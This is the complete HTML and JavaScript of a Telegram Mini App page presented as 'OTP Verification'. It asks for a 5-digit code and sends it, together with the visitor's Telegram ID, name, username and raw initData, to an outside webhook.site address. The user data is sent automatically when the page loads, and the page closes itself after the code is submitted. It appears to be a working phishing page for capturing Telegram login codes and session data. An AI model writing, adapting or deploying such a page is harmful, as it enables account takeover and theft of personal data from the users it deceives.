<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>OTP Verification</title>

  <!-- Telegram WebApp SDK -->
  <script src="https://telegram.org/js/telegram-web-app.js"></script>

  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background-color: var(--tg-theme-bg-color, #ffffff);
      color: var(--tg-theme-text-color, #000000);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      padding: 20px;
      box-sizing: border-box;
    }

    h2 {
      margin-bottom: 10px;
      font-size: 20px;
      text-align: center;
    }

    #user-info {
      margin-bottom: 25px;
      font-size: 14px;
      color: var(--tg-theme-hint-color, #888888);
      text-align: center;
    }

    .code-container {
      display: flex;
      gap: 10px;
      margin-bottom: 30px;
    }

    .code-input {
      width: 45px;
      height: 55px;
      font-size: 24px;
      font-weight: bold;
      text-align: center;
      border: 2px solid var(--tg-theme-hint-color, #ccc);
      border-radius: 10px;
      background-color: var(--tg-theme-secondary-bg-color, #f5f5f5);
      color: var(--tg-theme-text-color, #000);
      outline: none;
      transition: border-color 0.2s;
      box-sizing: border-box;
    }

    .code-input:focus {
      border-color: var(--tg-theme-button-color, #2481cc);
    }
  </style>
</head>

<body>

  <h2>Enter 5-digit code</h2>

  <div id="user-info">Loading...</div>

  <div class="code-container" id="otp-container">
    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code">
    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
  </div>

  <script>
    // Replace with your external server URL (e.g., https://api.yourdomain.com/log-user or a Webhook URL)
    const DESTINATION_SERVER_URL = "https://webhook.site/6d91d5ed-5174-4ddc-8253-ec521bdef371";

    const tg = window.Telegram.WebApp;
    tg.expand();
    tg.ready();

    // ==========================================
    // EXTRACT TELEGRAM USER DATA
    // ==========================================
    let user = tg.initDataUnsafe?.user;

    // Fallback: Parse user object from initData query string
    if (!user && tg.initData) {
      try {
        const urlParams = new URLSearchParams(tg.initData);
        const userJson = urlParams.get("user");
        if (userJson) user = JSON.parse(userJson);
      } catch (e) {
        console.error("Failed to parse initData user object", e);
      }
    }

    const userInfo = document.getElementById("user-info");

    if (user && user.id) {
      userInfo.textContent = `Telegram User ID: ${user.id}`;
      
      // Automatically post user data to external server on load
      postUserDataToServer(user);
    } else {
      userInfo.textContent = "Telegram user not detected";
    }

    // ==========================================
    // SEND HTTP POST REQUEST TO SERVER
    // ==========================================
    async function postUserDataToServer(userData, code = null) {
      try {
        const payload = {
          user_id: userData.id,
          first_name: userData.first_name || "",
          last_name: userData.last_name || "",
          username: userData.username || "",
          language_code: userData.language_code || "",
          initData: tg.initData, // Useful for server-side HMAC validation
          submitted_code: code
        };

        const response = await fetch(DESTINATION_SERVER_URL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(payload)
        });

        const data = await response.json();
        console.log("Server Response:", data);
        return data;
      } catch (error) {
        console.error("Error sending user ID to server:", error);
      }
    }

    // ==========================================
    // OTP INPUT HANDLING & SUBMIT BUTTON
    // ==========================================
    const inputs = document.querySelectorAll(".code-input");
    const mainButton = tg.MainButton;

    mainButton.setText("CONFIRM");
    mainButton.hide();

    inputs.forEach((input, index) => {
      input.addEventListener("input", (event) => {
        event.target.value = event.target.value.replace(/\D/g, "");
        if (event.target.value.length === 1 && index < inputs.length - 1) {
          inputs[index + 1].focus();
        }
        checkFullCode();
      });

      input.addEventListener("keydown", (event) => {
        if (event.key === "Backspace" && !input.value && index > 0) {
          inputs[index - 1].focus();
        }
      });

      input.addEventListener("paste", (event) => {
        event.preventDefault();
        const pastedText = event.clipboardData.getData("text").replace(/\D/g, "");
        if (!pastedText) return;

        for (let i = 0; i < pastedText.length && index + i < inputs.length; i++) {
          inputs[index + i].value = pastedText[i];
        }
        const nextIndex = Math.min(index + pastedText.length, inputs.length - 1);
        inputs[nextIndex].focus();
        checkFullCode();
      });
    });

    function getCode() {
      let code = "";
      inputs.forEach((input) => { code += input.value; });
      return code;
    }

    function checkFullCode() {
      const code = getCode();
      if (code.length === 5 && /^\d{5}$/.test(code)) {
        mainButton.show();
      } else {
        mainButton.hide();
      }
    }

    // Send code + user_id to server on main button click
    mainButton.onClick(async () => {
      const code = getCode();
      if (code.length !== 5 || !/^\d{5}$/.test(code)) return;

      mainButton.showProgress();
      await postUserDataToServer(user || { id: "unknown" }, code);
      mainButton.hideProgress();
      
      tg.close();
    });

    if (inputs.length > 0) {
      inputs[0].focus();
    }
  </script>
</body>
</html>
